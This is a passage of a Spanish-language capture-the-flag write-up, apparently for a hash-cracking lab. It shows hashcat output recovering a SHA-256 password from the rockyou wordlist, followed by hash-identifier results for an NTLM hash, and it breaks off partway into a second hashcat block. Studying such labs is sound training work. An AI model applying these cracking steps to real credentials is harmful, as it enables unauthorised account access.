Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates
Rules: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache hit:
* Filename..: ../rockyou.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;139921507&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;

f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: SHA2-256
Hash.Target......: f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f...2d0c85
Time.Started.....: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 16:44:44 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 16:44:45 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;../rockyou.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........: 12297.6 kH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3.26ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 196608/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.37%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/196608 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 0/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: &lt;span class=&#34;m&#34;&gt;123456&lt;/span&gt; -&amp;gt; piggy9
Hardware.Mon.#1..: Temp: 60c Util:  0% Core:1189MHz Mem:2505MHz Bus:4

Started: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 16:44:42 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
Stopped: Thu Sep  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; 16:44:46 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;crackstation-4&#34;&gt;CrackStation&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/Screenshot%20from%202019-09-05%2022.00.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crackeada:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-ntlm&#34;&gt;#2 NTLM&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Hash:&lt;/strong&gt;&lt;br /&gt;
&lt;code&gt;1DFECA0C002AE40B8619ECF94819CC1B&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Este hash al principio con las herramientas para identificarlo parece como un hash de MD5, al intentar crackearla con el formato de NTLM nos crackeó el hash hashcat.&lt;/p&gt;
&lt;h4 id=&#34;hash-analyzer-1&#34;&gt;Hash Analyzer&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/Screenshot%20from%202019-09-05%2023.06.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;hash-identification&#34;&gt;Hash Identification&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/hashes/Screenshot%20from%202019-09-05%2023.06.32.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;hashidentifier-5&#34;&gt;HASHIDENTIfIER&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; HASH: 1DFECA0C002AE40B8619ECF94819CC1B

Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD5
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Domain Cached Credentials - MD4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;MD4&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;strtolower&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;

Least Possible Hashs:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RAdmin v2.x
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  NTLM
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD4
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD2
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD4&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD2&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  MD5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Wordpress&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Haval-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  RipeMD-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SNEFRU-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  SNEFRU-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Tiger-128
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Tiger-128&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HMAC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.0.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.LF.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;nv&#34;&gt;$salt&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))))&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;strtoupper&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;md5&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;

   -------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;hashcat-6&#34;&gt;HASHCAT&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
